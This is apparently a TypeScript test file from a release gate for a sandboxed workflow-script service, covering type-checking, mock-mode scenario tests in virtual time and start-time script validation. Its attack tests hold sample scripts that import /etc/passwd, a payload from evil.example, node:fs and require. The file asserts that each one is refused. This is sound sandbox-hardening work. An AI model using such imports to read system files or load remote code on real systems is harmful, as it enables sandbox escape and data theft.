/**
 * Area "Check and test" of the release gate: `POST /v1/check` and the checks at start on setup A
 * (deployed), and `POST /v1/test` (scenarios in mock mode, in virtual time) on setup B, a server
 * with both roles: in production the edge sends `/v1/test` to the workers, and the api role
 * answers it with 503 (`archi/03-execution.md`, "Starting a run"; `archi/04-tools.md`,
 * "Type-checking"; `archi/05`, "Testing and mocks").
 */
import {
  Api,
  allow5xx,
  evidence,
  expect,
  expectOk,
  expectProblem,
  expectRefused,
  newTenant,
  stacks,
  type Tenant,
  test,
} from "../support/gate.js";
import { runIds, startRun } from "../support/runs-helpers.js";

let tenant: Tenant;
let api: Api;
let toolset: string;
/** The tenant on setup B, for `/v1/test`. */
let tested: Api;
let testedToolset: string;

const TOOLSET = {
  host: [
    {
      name: "crm.lookup",
      description: "Find a customer by email.",
      inputSchema: { type: "object", properties: { email: { type: "string" } }, required: ["email"] },
      outputSchema: {
        type: "object",
        properties: { id: { type: "string" }, notes: { type: "string" } },
        required: ["id", "notes"],
      },
    },
  ],
};

const SCENARIO_SCRIPT = `import { crm } from "rewind:tools";
import { signal, sleep } from "rewind";

export default async function main(input: { email: string }) {
  const customer = await crm.lookup({ email: input.email });
  const before = Date.now();
  await sleep("10d");
  const decision = await signal<{ refund: number }>("decision");
  return { customer: customer.id, refund: decision.refund, slept: Date.now() - before };
}
`;

test.beforeAll(async () => {
  tenant = await newTenant("check-test");
  api = tenant.api.ns("checks");
  const created = await tenant.api.post("/v1/toolsets", TOOLSET);
  expectOk(created);
  toolset = created.json.id;

  const onB = await newTenant("check-test", stacks().b);
  tested = onB.api.ns("tests");
  const createdB = await onB.api.post("/v1/toolsets", TOOLSET);
  expectOk(createdB);
  testedToolset = createdB.json.id;
});

/** `POST /v1/check`. */
const check = (as: Api, script: string, withToolset = toolset) => as.post("/v1/check", { script, toolset: withToolset });

// ---------------------------------------------------------------------------------------------
// Success

test("a correct script checks clean against its toolset", { tag: "@success" }, async () => {
  const reply = await check(
    api,
    `import { crm } from "rewind:tools";
export default async function main(input: { email: string }) {
  const customer = await crm.lookup({ email: input.email });
  return customer.notes.length;
}
`,
  );
  expectOk(reply, 200);
  expect(reply.json.ok, JSON.stringify(reply.json)).toBe(true);
  expect(reply.json.diagnostics.filter((d: any) => d.severity === "error")).toEqual([]);
});

test("a scenario runs in mock mode and virtual time: a 10-day sleep, a signal, static responses", { tag: "@success" }, async () => {
  const started = Date.now();
  const reply = await tested.post("/v1/test", {
    script: SCENARIO_SCRIPT,
    toolset: testedToolset,
    input: { email: "ada@example.com" },
    tools: { "crm.lookup": { id: "cus_ada", notes: "" } },
    signals: [{ name: "decision", payload: { refund: 10 } }],
    expect: { status: "completed", output: { customer: "cus_ada", refund: 10 }, calls: { "crm.lookup": 1 } },
  });
  expectOk(reply, 200);
  expect(reply.json.passed, JSON.stringify(reply.json)).toBe(true);
  expect(reply.json.failures).toEqual([]);
  expect(reply.json.status).toBe("completed");
  expect(reply.json.output.slept).toBe(10 * 24 * 3_600_000);
  expect(reply.json.calls).toEqual({ "crm.lookup": 1 });
  expect(reply.json.trace).toContain("crm.lookup");
  expect(Date.now() - started, "ten days pass in virtual time").toBeLessThan(20_000);
});

test("a scenario's TypeScript mock handlers answer the calls", { tag: "@success" }, async () => {
  const reply = await tested.post("/v1/test", {
    script: SCENARIO_SCRIPT,
    toolset: testedToolset,
    input: { email: "grace@example.com" },
    mocks: `export default {
  crm: { lookup: ({ email }, call) => ({ id: "cus_" + email.split("@")[0], notes: call.tool }) },
};
`,
    signals: [{ name: "decision", when: "2h", payload: { refund: 0 } }],
    expect: { status: "completed", output: { customer: "cus_grace", refund: 0 } },
  });
  expectOk(reply, 200);
  expect(reply.json.passed, JSON.stringify(reply.json)).toBe(true);
});

// ---------------------------------------------------------------------------------------------
// Failures

test("a type error is reported for a model: its code, its line and a frame of the source", { tag: "@failure" }, async () => {
  const reply = await check(
    api,
    `import { crm } from "rewind:tools";
export default async function main() {
  const customer = await crm.lookup({ email: 42 });
  return customer.id;
}
`,
  );
  expectOk(reply, 200);
  expect(reply.json.ok).toBe(false);
  const error = reply.json.diagnostics.find((d: any) => d.severity === "error");
  expect(error, JSON.stringify(reply.json)).toBeTruthy();
  expect(error.code).toMatch(/^TS\d+$/);
  expect(error.location).toMatchObject({ line: 3 });
  expect(error.frame ?? "").toContain("crm.lookup");
});

test("the checker's own rules: a forgotten await, and a global the sandbox has not with a hint", { tag: "@failure" }, async () => {
  const floating = await check(
    api,
    `import { crm } from "rewind:tools";
export default async function main() {
  crm.lookup({ email: "a@example.com" });
  return "done";
}
`,
  );
  expectOk(floating, 200);
  expect(floating.json.ok).toBe(false);
  expect(floating.json.diagnostics.map((d: any) => d.code)).toContain("rewind/floating-promise");

  const absent = await check(api, `export default async function main() {\n  return process.env.HOME;\n}\n`);
  expectOk(absent, 200);
  expect(absent.json.ok).toBe(false);
  const hinted = absent.json.diagnostics.find((d: any) => typeof d.hint === "string" && d.hint.length > 0);
  expect(hinted, JSON.stringify(absent.json)).toBeTruthy();
  expect(`${hinted.message} ${hinted.hint}`).toContain("process");
});

test("a start whose script does not type-check is 422 invalid-script with its diagnostics, and no run exists", { tag: "@failure" }, async () => {
  const before = await runIds(api);
  const reply = await startRun(api, {
    toolset,
    script: `import { crm } from "rewind:tools";
export default async function main() {
  return await crm.lookup({ email: 42 });
}
`,
  });
  expectProblem(reply, 422, "invalid-script");
  expect((reply.json.diagnostics ?? []).some((d: any) => /^TS\d+$/.test(d.code)), reply.text).toBe(true);
  expect(await runIds(api)).toEqual(before);
});

test("the checks at start refuse what cannot run even unchecked: a syntax error, no default export, a tool not in the toolset", { tag: "@failure" }, async () => {
  const before = await runIds(api);
  const cases: [string, string][] = [
    ["export default async function main( {\n  return 1;\n}\n", "SyntaxError"],
    ["export async function main() {\n  return 1;\n}\n", "no default export"],
    [`import { billing } from "rewind:tools";\nexport default async function main() { return billing.refund({}); }\n`, "no export named \"billing\""],
    [`export default 42;\n`, "export default` its main function"],
  ];
  for (const [script, words] of cases) {
    const reply = await startRun(api, { toolset, script, check: false });
    expectProblem(reply, 422, "invalid-script");
    expect(reply.json.detail, reply.text).toContain(words);
  }
  expect(await runIds(api)).toEqual(before);
});

test("a scenario whose expectations do not hold says which, in sentences", { tag: "@failure" }, async () => {
  const reply = await tested.post("/v1/test", {
    script: SCENARIO_SCRIPT,
    toolset: testedToolset,
    input: { email: "ada@example.com" },
    tools: { "crm.lookup": { $error: "the CRM is down" } },
    signals: [{ name: "decision", payload: { refund: 10 } }],
    expect: { status: "completed", calls: { "crm.lookup": 2 } },
  });
  expectOk(reply, 200);
  expect(reply.json.passed).toBe(false);
  expect(reply.json.status).toBe("failed");
  expect(reply.json.error?.name).toBe("ToolError");
  expect(reply.json.failures.length).toBeGreaterThanOrEqual(2);
  expect(reply.json.failures.join("\n")).toContain("crm.lookup");
});

test("on setup A, the edge sends /v1/test to a worker, where the scenario runs", { tag: "@success" }, async () => {
  const reply = await api.post("/v1/test", {
    script: "export default async function main(input: { n: number }) { return input.n + 1; }\n",
    input: { n: 41 },
    expect: { status: "completed", output: 42 },
  });
  expectOk(reply, 200);
  expect(reply.json.passed, JSON.stringify(reply.json)).toBe(true);
});

test("checking or testing without Rewind-Namespace is 400, and the api role refuses /v1/test with 503", { tag: "@failure" }, async () => {
  expectProblem(await tenant.api.post("/v1/check", { script: "export default async function main() {}\n" }), 400, "invalid-request");
  allow5xx("unavailable");
  // The api server itself, behind the edge: it runs no script.
  const apiOnly = await new Api(stacks().a.apiUrl, tenant.ownerKey).ns("checks").post("/v1/test", { script: "export default async function main() {}\n" });
  expectProblem(apiOnly, 503, "unavailable");
  expect(apiOnly.json.detail).toContain("worker role");
});

test("a namespace's maxScriptLines refuses a longer script in check, test and start alike", { tag: "@failure" }, async () => {
  const long = `export default async function main() {\n  const a = 1;\n  const b = 2;\n  return a + b;\n}\n`;
  for (const [as, owner] of [
    [api, tenant.api],
    [tested, undefined],
  ] as const) {
    const ownerApi = owner ?? new (await import("../support/gate.js")).Api(stacks().b.url, (as as Api).bearer);
    expectOk(await ownerApi.put("/v1/namespaces/short", { exceptions: { maxScriptLines: 3 } }));
  }
  const short = api.ns("short");
  const checked = await short.post("/v1/check", { script: long });
  expectProblem(checked, 422, "invalid-script");
  expect(checked.json.detail).toMatch(/lines/);
  expectProblem(await startRun(short, { script: long }), 422, "invalid-script");
  expectProblem(await tested.ns("short").post("/v1/test", { script: long }), 422, "invalid-script");
  // The same script in a namespace without the exception is fine.
  expect((await api.post("/v1/check", { script: long })).json.ok).toBe(true);
});

// ---------------------------------------------------------------------------------------------
// Attacks

test("every way to load code from outside is refused before any run exists", { tag: "@attack" }, async () => {
  const sources = [
    `import fs from "node:fs";\nexport default async function main() { return typeof fs; }\n`,
    `import passwd from "file:///etc/passwd";\nexport default async function main() { return passwd; }\n`,
    `import payload from "https://evil.example/payload.js";\nexport default async function main() { return payload; }\n`,
    `import payload from "data:text/javascript,export default 1";\nexport default async function main() { return payload; }\n`,
    `import other from "./other.ts";\nexport default async function main() { return other; }\n`,
    `export default async function main() { const fs = await import("node:fs"); return typeof fs; }\n`,
    `import fs = require("fs");\nexport default async function main() { return typeof fs; }\n`,
    // archi/03-execution.md, "Starting a run": a `require` is refused at start.
    `export default async function main() { const fs = require("fs"); return typeof fs; }\n`,
    `import { readFile } from "rewind";\nexport default async function main() { return typeof readFile; }\n`,
  ];
  for (const script of sources) {
    const reply = await expectRefused({
      attempt: () => startRun(api, { script, check: false }),
      status: 422,
      slug: "invalid-script",
      probe: () => runIds(api),
    });
    evidence(`${script.split("\n")[0]!.slice(0, 70)} → 422: ${String(reply.json.detail).slice(0, 120)}`);
  }
});

test("mock handlers run in a sandbox of their own: no imports, no process, no network", { tag: "@attack" }, async () => {
  const imported = await tested.post("/v1/test", {
    script: SCENARIO_SCRIPT,
    toolset: testedToolset,
    mocks: `import fs from "node:fs";\nexport default { crm: { lookup: () => ({ id: typeof fs, notes: "" }) } };\n`,
  });
  expectProblem(imported, 400, "invalid-request");
  expect(imported.json.detail).toContain("the mocks cannot load");

  const probing = await tested.post("/v1/test", {
    script: SCENARIO_SCRIPT,
    toolset: testedToolset,
    input: { email: "eve@example.com" },
    mocks: `export default {
  crm: {
    lookup: () => ({
      id: [typeof process, typeof Deno, typeof require, typeof fetch, typeof WebAssembly].join("/"),
      notes: "",
    }),
  },
};
`,
    signals: [{ name: "decision", payload: { refund: 0 } }],
    expect: { status: "completed" },
  });
  expectOk(probing, 200);
  expect(probing.json.status, JSON.stringify(probing.json)).toBe("completed");
  expect(probing.json.output.customer).toBe("undefined/undefined/undefined/undefined/undefined");
  evidence("mocks importing node:fs: 400 the mocks cannot load; process, Deno, require, fetch, WebAssembly are undefined in their isolate");
});
